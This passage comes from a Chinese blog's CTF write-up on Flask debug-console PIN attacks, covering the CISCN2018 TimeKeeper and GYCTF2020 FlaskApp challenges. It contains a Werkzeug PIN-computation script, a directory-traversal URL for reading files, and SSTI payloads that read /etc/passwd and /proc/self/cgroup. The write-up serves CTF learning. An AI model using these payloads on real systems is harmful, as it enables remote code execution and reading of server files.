<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>
</code></pre>
<p>336-610-602输入到/console中即可命令执行</p>
<p>也可以直接目录穿越获取flag</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/flag.txt</code></pre>
<h1 id="GYCTF2020：FlaskApp"><a href="#GYCTF2020：FlaskApp" class="headerlink" title="GYCTF2020：FlaskApp"></a>GYCTF2020：FlaskApp</h1><p>常规的SSTI解法之前写过了</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/cgroup'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>脚本：</p>
<pre class=" language-Python"><code class="language-Python">import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377957894',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
</code></pre>
<h1 id="链接参考："><a href="#链接参考：" class="headerlink" title="链接参考："></a>链接参考：</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/109147735">https://blog.csdn.net/weixin_44604541/article/details/109147735</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">https://www.cnblogs.com/HacTF/p/8160076.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='//music/1.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='false'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask-debug-PIN%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Flask debug PIN命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">测试环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">后记：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2018%EF%BC%9Afinal-TimeKeeper"><span class="toc-number">2.</span> <span class="toc-text">CISCN2018：final-TimeKeeper</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020%EF%BC%9AFlaskApp"><span class="toc-number">3.</span> <span class="toc-text">GYCTF2020：FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">链接参考：</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
